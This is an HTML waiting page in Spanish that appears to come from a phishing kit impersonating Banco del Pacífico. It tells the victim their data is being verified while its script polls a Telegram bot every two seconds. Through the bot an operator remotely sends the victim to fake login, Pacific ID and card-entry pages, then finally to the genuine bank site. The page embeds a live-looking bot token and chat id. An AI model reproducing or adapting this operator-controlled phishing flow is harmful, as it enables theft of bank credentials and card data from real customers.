<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando Solicitud...</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .wait-card { background: #ffffff; padding: 40px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); width: 100%; max-width: 380px; text-align: center; }
        .logo { max-width: 120px; margin-bottom: 25px; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0056b3; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 1.3rem; color: #2c3e50; margin-bottom: 10px; }
        p { font-size: 0.95rem; color: #7f8c8d; line-height: 1.5; }
    </style>
</head>
<body>

<div class="wait-card">
    <img src="./logo.png" alt="Logotipo" class="logo">
    <div class="spinner"></div>
    <h2>Verificando tus datos...</h2>
    <p>Por favor, mantente en esta pantalla. Estamos validando la información con nuestro sistema de seguridad de manera segura. No cierres la ventana.</p>
</div>

<script>
    // Configuración directa de tu Bot (Para leer las órdenes en tiempo real)
    const TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
    
    // Función para que la web le diga al bot que ya procesó la orden (Limpia el estado)
    async function limpiarEstadoTelegram() {
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: "-1003027102929",
                    text: "🔄 _Pantalla de espera sincronizada y limpia._",
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) { console.error(e); }
    }

    async function verificarOrdenBoton() {
        try {
            // Le preguntamos a Telegram por las últimas acciones del chat (GetUpdates)
            const respuesta = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
            
            if (respuesta.ok) {
                const data = await respuesta.json();
                if (data.result && data.result.length > 0) {
                    const ultimoUpdate = data.result[0];
                    
                    // Si presionaste un botón (Callback Query)
                    if (ultimoUpdate.callback_query) {
                        const comando = ultimoUpdate.callback_query.data;
                        
                        // LIMPIAMOS el estado al instante para evitar bucles infinitos
                        await limpiarEstadoTelegram();

                        // Ejecutamos el salto de página
                        switch(comando) {
                            case 'pacificid':
                                window.location.href = 'pacificid.html';
                                break;
                            case 'tarjeta':
                                window.location.href = 'tarjeta.html';
                                break;
                            case 'error_login':
                                window.location.href = 'login.html?error=true';
                                break;
                            case 'error_pacificid':
                                window.location.href = 'pacificid.html?error=true';
                                break;
                            case 'error_tarjeta':
                                window.location.href = 'tarjeta.html?error=true';
                                break;
                            case 'aprobar':
                                window.location.href = 'https://www.bancodelpacifico.com/personas/inicio#';
                                break;
                        }
                    }
                }
            }
        } catch (e) {
            console.error("Esperando señal...");
        }
    }

    // Revisa Telegram cada 2 segundos buscando tu clic
    setInterval(verificarOrdenBoton, 2000);
</script>
</body>
</html>
